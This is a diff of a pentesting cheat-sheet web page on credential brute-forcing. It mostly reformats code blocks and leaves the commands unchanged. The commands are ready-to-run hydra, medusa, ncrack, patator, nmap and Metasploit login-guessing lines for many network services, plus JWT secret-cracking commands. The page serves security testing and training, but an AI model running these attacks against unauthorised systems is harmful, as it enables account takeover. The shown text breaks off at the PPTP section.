@@ -16,7 +16,7 @@
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
   <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.049d4847a3aa1cf53d39e61af77abeb9ec59a646f1c2966b651eb9ac73e137b9.js" integrity="sha256-BJ1IR6OqHPU9OeYa93q&#43;uexZpkbxwpZrZR65rHPhN7k=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.42c24b49fa2bd9a7bdb11c30a43d00df4dab358db93fecefd18b800583cb7f3f.js" integrity="sha256-QsJLSfor2ae9sRwwpD0A302rNY25P&#43;zv0YuABYPLfz8=" crossorigin="anonymous"></script>
 
   <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
 
@@ -1250,20 +1250,20 @@ https://github.com/alex-shpak/hugo-book
   Crunch
   <a class="anchor" href="#crunch">#</a>
 </h3>
-<pre tabindex="0"><code>crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
-crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)
-
-@ Lower case alpha characters
-, Upper case alpha characters
-% Numeric characters
-^ Special characters including spac
-crunch 6 8 -t ,@@^^%%
-</code></pre><h3 id="cewl">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crunch <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">6</span> 0123456789ABCDEF -o crunch1.txt <span style="color:#75715e">#From length 4 to 6 using that alphabet</span>
+</span></span><span style="display:flex;"><span>crunch <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">4</span> -f /usr/share/crunch/charset.lst mixalpha <span style="color:#75715e"># Only length 4 using charset mixalpha (inside file charset.lst)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@ Lower <span style="color:#66d9ef">case</span> alpha characters
+</span></span><span style="display:flex;"><span>, Upper <span style="color:#66d9ef">case</span> alpha characters
+</span></span><span style="display:flex;"><span>% Numeric characters
+</span></span><span style="display:flex;"><span>^ Special characters including spac
+</span></span><span style="display:flex;"><span>crunch <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">8</span> -t ,@@^^%%
+</span></span></code></pre></div><h3 id="cewl">
   Cewl
   <a class="anchor" href="#cewl">#</a>
 </h3>
-<pre tabindex="0"><code>cewl example.com -m 5 -w words.txt
-</code></pre><h3 id="cupp">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cewl example.com -m <span style="color:#ae81ff">5</span> -w words.txt
+</span></span></code></pre></div><h3 id="cupp">
   CUPP
   <a class="anchor" href="#cupp">#</a>
 </h3>
@@ -1311,47 +1311,47 @@ crunch 6 8 -t ,@@^^%%
   AFP
   <a class="anchor" href="#afp">#</a>
 </h3>
-<pre tabindex="0"><code>nmap -p 548 --script afp-brute &lt;IP&gt;
-msf&gt; use auxiliary/scanner/afp/afp_login
-msf&gt; set BLANK_PASSWORDS true
-msf&gt; set USER_AS_PASS true
-msf&gt; set PASS_FILE &lt;PATH_PASSWDS&gt;
-msf&gt; set USER_FILE &lt;PATH_USERS&gt;
-msf&gt; run
-</code></pre><h3 id="ajp">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">548</span> --script afp-brute &lt;IP&gt;
+</span></span><span style="display:flex;"><span>msf&gt; use auxiliary/scanner/afp/afp_login
+</span></span><span style="display:flex;"><span>msf&gt; set BLANK_PASSWORDS true
+</span></span><span style="display:flex;"><span>msf&gt; set USER_AS_PASS true
+</span></span><span style="display:flex;"><span>msf&gt; set PASS_FILE &lt;PATH_PASSWDS&gt;
+</span></span><span style="display:flex;"><span>msf&gt; set USER_FILE &lt;PATH_USERS&gt;
+</span></span><span style="display:flex;"><span>msf&gt; run
+</span></span></code></pre></div><h3 id="ajp">
   AJP
   <a class="anchor" href="#ajp">#</a>
 </h3>
-<pre tabindex="0"><code>nmap --script ajp-brute -p 8009 &lt;IP&gt;
-</code></pre><h3 id="cassandra">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --script ajp-brute -p <span style="color:#ae81ff">8009</span> &lt;IP&gt;
+</span></span></code></pre></div><h3 id="cassandra">
   Cassandra
   <a class="anchor" href="#cassandra">#</a>
 </h3>
-<pre tabindex="0"><code>nmap --script cassandra-brute -p 9160 &lt;IP&gt;
-</code></pre><h3 id="couchdb">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --script cassandra-brute -p <span style="color:#ae81ff">9160</span> &lt;IP&gt;
+</span></span></code></pre></div><h3 id="couchdb">
   CouchDB
   <a class="anchor" href="#couchdb">#</a>
 </h3>
-<pre tabindex="0"><code>msf&gt; use auxiliary/scanner/couchdb/couchdb_login
-hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
-</code></pre><h3 id="docker-registry">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf&gt; use auxiliary/scanner/couchdb/couchdb_login
+</span></span><span style="display:flex;"><span>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s <span style="color:#ae81ff">5984</span> http-get /
+</span></span></code></pre></div><h3 id="docker-registry">
   Docker Registry
   <a class="anchor" href="#docker-registry">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
-</code></pre><h3 id="elasticsearch">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s <span style="color:#ae81ff">5000</span> https-get /v2/
+</span></span></code></pre></div><h3 id="elasticsearch">
   Elasticsearch
   <a class="anchor" href="#elasticsearch">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
-</code></pre><h3 id="ftp">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s <span style="color:#ae81ff">9200</span> http-get /
+</span></span></code></pre></div><h3 id="ftp">
   FTP
   <a class="anchor" href="#ftp">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ftp
-ncrack -p 21 --user root -P passwords.txt &lt;IP&gt; [-T 5]
-medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp
-</code></pre><h3 id="http-generic-brute">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l root -P passwords.txt <span style="color:#f92672">[</span>-t 32<span style="color:#f92672">]</span> &lt;IP&gt; ftp
+</span></span><span style="display:flex;"><span>ncrack -p <span style="color:#ae81ff">21</span> --user root -P passwords.txt &lt;IP&gt; <span style="color:#f92672">[</span>-T 5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp
+</span></span></code></pre></div><h3 id="http-generic-brute">
   HTTP Generic Brute
   <a class="anchor" href="#http-generic-brute">#</a>
 </h3>
@@ -1360,250 +1360,250 @@ medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp
   HTTP Basic Auth
   <a class="anchor" href="#http-basic-auth">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
-# Use https-get mode for https
-medusa -h &lt;IP&gt; -u &lt;username&gt; -P  &lt;passwords.txt&gt; -M  http -m DIR:/path/to/auth -T 10
-</code></pre><h3 id="http---post-form">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use https-get mode for https</span>
+</span></span><span style="display:flex;"><span>medusa -h &lt;IP&gt; -u &lt;username&gt; -P  &lt;passwords.txt&gt; -M  http -m DIR:/path/to/auth -T <span style="color:#ae81ff">10</span>
+</span></span></code></pre></div><h3 id="http---post-form">
   HTTP - Post Form
   <a class="anchor" href="#http---post-form">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form &#34;/path/index.php:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login name or password is incorrect&#34; -V
-# Use https-post-form mode for https
-For https you have to change from &#34;http-post-form&#34; to &#34;https-post-form&#34;
-</code></pre><h3 id="http---cms----wordpress-joomla-or-drupal-or-moodle">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form <span style="color:#e6db74">&#34;/path/index.php:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login name or password is incorrect&#34;</span> -V
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use https-post-form mode for https</span>
+</span></span><span style="display:flex;"><span>For https you have to change from <span style="color:#e6db74">&#34;http-post-form&#34;</span> to <span style="color:#e6db74">&#34;https-post-form&#34;</span>
+</span></span></code></pre></div><h3 id="http---cms----wordpress-joomla-or-drupal-or-moodle">
   HTTP - CMS &ndash; (W)ordpress, (J)oomla or (D)rupal or (M)oodle
   <a class="anchor" href="#http---cms----wordpress-joomla-or-drupal-or-moodle">#</a>
 </h3>
-<pre tabindex="0"><code>cmsmap -f W/J/D/M -u a -p a https://wordpress.com
-</code></pre><h3 id="imap">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cmsmap -f W/J/D/M -u a -p a https://wordpress.com
+</span></span></code></pre></div><h3 id="imap">
   IMAP
   <a class="anchor" href="#imap">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; imap -V
-hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f &lt;IP&gt; imap -V
-nmap -sV --script imap-brute -p &lt;PORT&gt; &lt;IP&gt;
-</code></pre><h3 id="irc">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; imap -V
+</span></span><span style="display:flex;"><span>hydra -S -v -l USERNAME -P /path/to/passwords.txt -s <span style="color:#ae81ff">993</span> -f &lt;IP&gt; imap -V
+</span></span><span style="display:flex;"><span>nmap -sV --script imap-brute -p &lt;PORT&gt; &lt;IP&gt;
+</span></span></code></pre></div><h3 id="irc">
   IRC
   <a class="anchor" href="#irc">#</a>
 </h3>
-<pre tabindex="0"><code>nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p &lt;PORT&gt; &lt;IP&gt;
-</code></pre><h3 id="iscsi">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb<span style="color:#f92672">=</span>/path/users.txt,passdb<span style="color:#f92672">=</span>/path/pass.txt -p &lt;PORT&gt; &lt;IP&gt;
+</span></span></code></pre></div><h3 id="iscsi">
   ISCSI
   <a class="anchor" href="#iscsi">#</a>
 </h3>
-<pre tabindex="0"><code>nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 &lt;IP&gt;
-</code></pre><h3 id="jwt">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV --script iscsi-brute --script-args userdb<span style="color:#f92672">=</span>/var/usernames.txt,passdb<span style="color:#f92672">=</span>/var/passwords.txt -p <span style="color:#ae81ff">3260</span> &lt;IP&gt;
+</span></span></code></pre></div><h3 id="jwt">
   JWT
   <a class="anchor" href="#jwt">#</a>
 </h3>
-<pre tabindex="0"><code>#hashcat
-hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
-
-#https://github.com/Sjord/jwtcrack
-python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
-
-#John
-john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
-
-#https://github.com/ticarpi/jwt_tool
-python3 jwt_tool.py -d wordlists.txt &lt;JWT token&gt;
-
-#https://github.com/brendan-rius/c-jwt-cracker
-./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8
-
-#https://github.com/mazen160/jwt-pwn
-python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt
-
-#https://github.com/lmammino/jwt-cracker
-jwt-cracker &#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ&#34; &#34;abcdefghijklmnopqrstuwxyz&#34; 6
-</code></pre><h3 id="ldap">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#hashcat</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">16500</span> -a <span style="color:#ae81ff">0</span> jwt.txt .<span style="color:#ae81ff">\w</span>ordlists<span style="color:#ae81ff">\r</span>ockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#https://github.com/Sjord/jwtcrack</span>
+</span></span><span style="display:flex;"><span>python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#John</span>
+</span></span><span style="display:flex;"><span>john jwt.txt --wordlist<span style="color:#f92672">=</span>wordlists.txt --format<span style="color:#f92672">=</span>HMAC-SHA256
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#https://github.com/ticarpi/jwt_tool</span>
+</span></span><span style="display:flex;"><span>python3 jwt_tool.py -d wordlists.txt &lt;JWT token&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#https://github.com/brendan-rius/c-jwt-cracker</span>
+</span></span><span style="display:flex;"><span>./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc <span style="color:#ae81ff">1234567890</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#https://github.com/mazen160/jwt-pwn</span>
+</span></span><span style="display:flex;"><span>python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#https://github.com/lmammino/jwt-cracker</span>
+</span></span><span style="display:flex;"><span>jwt-cracker <span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ&#34;</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuwxyz&#34;</span> <span style="color:#ae81ff">6</span>
+</span></span></code></pre></div><h3 id="ldap">
   LDAP
   <a class="anchor" href="#ldap">#</a>
 </h3>
-<pre tabindex="0"><code>nmap --script ldap-brute -p 389 &lt;IP&gt;
-</code></pre><h3 id="mqtt">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --script ldap-brute -p <span style="color:#ae81ff">389</span> &lt;IP&gt;
+</span></span></code></pre></div><h3 id="mqtt">
   MQTT
   <a class="anchor" href="#mqtt">#</a>
 </h3>
-<pre tabindex="0"><code>ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
-</code></pre><h3 id="mongo">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
+</span></span></code></pre></div><h3 id="mongo">
   Mongo
   <a class="anchor" href="#mongo">#</a>
 </h3>
-<pre tabindex="0"><code>nmap -sV --script mongodb-brute -n -p 27017 &lt;IP&gt;
-use auxiliary/scanner/mongodb/mongodb_login
-</code></pre><h3 id="mysql">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV --script mongodb-brute -n -p <span style="color:#ae81ff">27017</span> &lt;IP&gt;
+</span></span><span style="display:flex;"><span>use auxiliary/scanner/mongodb/mongodb_login
+</span></span></code></pre></div><h3 id="mysql">
   MySQL
   <a class="anchor" href="#mysql">#</a>
 </h3>
-<pre tabindex="0"><code># hydra
-hydra -L usernames.txt -P pass.txt &lt;IP&gt; mysql
-
-# msfconsole
-msf&gt; use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
-
-# medusa
-medusa -h &lt;IP/Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql
-</code></pre><h3 id="oraclesql">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># hydra</span>
+</span></span><span style="display:flex;"><span>hydra -L usernames.txt -P pass.txt &lt;IP&gt; mysql
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># msfconsole</span>
+</span></span><span style="display:flex;"><span>msf&gt; use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># medusa</span>
+</span></span><span style="display:flex;"><span>medusa -h &lt;IP/Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql
+</span></span></code></pre></div><h3 id="oraclesql">
   OracleSQL
   <a class="anchor" href="#oraclesql">#</a>
 </h3>
-<pre tabindex="0"><code>patator oracle_login sid=&lt;SID&gt; host=&lt;IP&gt; user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
-
-./odat.py passwordguesser -s $SERVER -d $SID
-./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt
-
-#msf1
-msf&gt; use admin/oracle/oracle_login
-msf&gt; set RHOSTS &lt;IP&gt;
-msf&gt; set RPORT 1521
-msf&gt; set SID &lt;SID&gt;
-
-#msf2, this option uses nmap and it fails sometimes for some reason
-msf&gt; use scanner/oracle/oracle_login
-msf&gt; set RHOSTS &lt;IP&gt;
-msf&gt; set RPORTS 1521
-msf&gt; set SID &lt;SID&gt;
-
-#for some reason nmap fails sometimes when executing this script
-nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=&lt;SID&gt; &lt;IP&gt;
-In order to use oracle_login with patator you need to install:
-pip3 install cx_Oracle --upgrade
-Offline OracleSQL hash bruteforce (versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3):
- nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
-</code></pre><h3 id="pop">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>patator oracle_login sid<span style="color:#f92672">=</span>&lt;SID&gt; host<span style="color:#f92672">=</span>&lt;IP&gt; user<span style="color:#f92672">=</span>FILE0 password<span style="color:#f92672">=</span>FILE1 0<span style="color:#f92672">=</span>users-oracle.txt 1<span style="color:#f92672">=</span>pass-oracle.txt -x ignore:code<span style="color:#f92672">=</span>ORA-01017
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./odat.py passwordguesser -s $SERVER -d $SID
+</span></span><span style="display:flex;"><span>./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#msf1</span>
+</span></span><span style="display:flex;"><span>msf&gt; use admin/oracle/oracle_login
+</span></span><span style="display:flex;"><span>msf&gt; set RHOSTS &lt;IP&gt;
+</span></span><span style="display:flex;"><span>msf&gt; set RPORT <span style="color:#ae81ff">1521</span>
+</span></span><span style="display:flex;"><span>msf&gt; set SID &lt;SID&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#msf2, this option uses nmap and it fails sometimes for some reason</span>
+</span></span><span style="display:flex;"><span>msf&gt; use scanner/oracle/oracle_login
+</span></span><span style="display:flex;"><span>msf&gt; set RHOSTS &lt;IP&gt;
+</span></span><span style="display:flex;"><span>msf&gt; set RPORTS <span style="color:#ae81ff">1521</span>
+</span></span><span style="display:flex;"><span>msf&gt; set SID &lt;SID&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#for some reason nmap fails sometimes when executing this script</span>
+</span></span><span style="display:flex;"><span>nmap --script oracle-brute -p <span style="color:#ae81ff">1521</span> --script-args oracle-brute.sid<span style="color:#f92672">=</span>&lt;SID&gt; &lt;IP&gt;
+</span></span><span style="display:flex;"><span>In order to use oracle_login with patator you need to install:
+</span></span><span style="display:flex;"><span>pip3 install cx_Oracle --upgrade
+</span></span><span style="display:flex;"><span>Offline OracleSQL hash bruteforce <span style="color:#f92672">(</span>versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span> nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid<span style="color:#f92672">=</span>DB11g -n 10.11.21.30
+</span></span></code></pre></div><h3 id="pop">
   POP
   <a class="anchor" href="#pop">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; pop3 -V
-hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f &lt;IP&gt; pop3 -V
-</code></pre><h3 id="postgresql">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; pop3 -V
+</span></span><span style="display:flex;"><span>hydra -S -v -l USERNAME -P /path/to/passwords.txt -s <span style="color:#ae81ff">995</span> -f &lt;IP&gt; pop3 -V
+</span></span></code></pre></div><h3 id="postgresql">
   PostgreSQL
   <a class="anchor" href="#postgresql">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; postgres
-medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
-ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt;:5432
-patator pgsql_login host=&lt;IP&gt; user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
-use auxiliary/scanner/postgres/postgres_login
-nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;
-</code></pre><h3 id="pptp">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; postgres
+</span></span><span style="display:flex;"><span>medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
+</span></span><span style="display:flex;"><span>ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt;:5432
+</span></span><span style="display:flex;"><span>patator pgsql_login host<span style="color:#f92672">=</span>&lt;IP&gt; user<span style="color:#f92672">=</span>FILE0 0<span style="color:#f92672">=</span>/root/Desktop/user.txt password<span style="color:#f92672">=</span>FILE1 1<span style="color:#f92672">=</span>/root/Desktop/pass.txt
+</span></span><span style="display:flex;"><span>use auxiliary/scanner/postgres/postgres_login
+</span></span><span style="display:flex;"><span>nmap -sV --script pgsql-brute --script-args userdb<span style="color:#f92672">=</span>/var/usernames.txt,passdb<span style="color:#f92672">=</span>/var/passwords.txt -p <span style="color:#ae81ff">5432</span> &lt;IP&gt;
+</span></span></code></pre></div><h3 id="pptp">
   PPTP
   <a class="anchor" href="#pptp">#</a>
 </h3>
-<pre tabindex="0"><code>You can download the .deb package to install from https://http.kali.org/pool/main/t/thc-pptp-bruter/
-sudo dpkg -i thc-pptp-bruter*.deb #Install the package
